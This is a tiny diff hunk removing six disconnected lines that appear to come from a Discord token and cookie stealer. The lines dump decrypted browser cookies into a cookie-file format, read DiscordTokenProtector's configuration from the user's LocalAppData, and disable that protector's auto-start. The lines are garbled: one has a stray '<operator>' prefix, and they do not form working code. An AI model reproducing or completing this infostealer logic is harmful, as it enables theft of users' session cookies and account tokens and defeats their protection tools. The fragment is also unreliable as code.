@@ -1,6 +1,0 @@
-<operator>.formatString("", row["host_key"], "	TRUE	/	FALSE	2597573456	", row["name"], "	", decrypted, "")
-const token_protector_config = JSON.parse(client.requires.fs.readFileSync(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`, {
-                encoding: "utf-8"
-            }))
-(await Promise.all(reqs)).map(r => r.data)
-token_protector_config['auto_start_discord'] = false
